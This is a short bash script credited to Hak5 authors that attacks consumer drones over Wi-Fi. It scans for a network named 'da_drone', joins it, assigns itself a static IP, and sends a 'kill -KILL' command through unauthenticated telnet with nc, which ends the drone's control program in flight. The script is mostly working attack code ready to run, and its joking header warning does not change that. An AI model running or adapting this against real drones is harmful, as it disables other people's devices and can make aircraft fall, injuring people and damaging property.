#!/bin/bash
# dronepwn.sh version 0.1 by Darren Kitchen – absolutely horrible code. 
# Do not use under any circumstance.
# Send all flame mail to hak5.wpengine.com

# Edited by Brad Roberts to make run more smoothly and get rid of dependency.

DRONESSID='da_drone'

while true; do
if ! ( iw wlan0 scan | grep SSID | grep da_drone ); then
	echo "No Drones Found"
else
	echo "Drone Found! Attempting to connect"
	iwconfig wlan1 essid $DRONESSID
	sleep 2
	echo "Testing Wireless Association"
	if ! ( iwconfig wlan1 | grep $DRONESSID ); then
		echo "Association to $DRONESSID failed"
	else
		echo "Association to $DRONESSID successful"

		echo "Setting Static IP Address"
		ifconfig wlan1 192.168.1.5 netmask 255.255.255.0 up
		sleep 2
		
		echo "Connecting to Telnet and sending kill command."
		echo "Killing drone...."
		echo ""
		echo "kill -KILL \`pidof pogram.elf\`" | nc 192.168.1.1 23 -w 1
		echo "Drone killed!"
	fi
fi

sleep 5
done

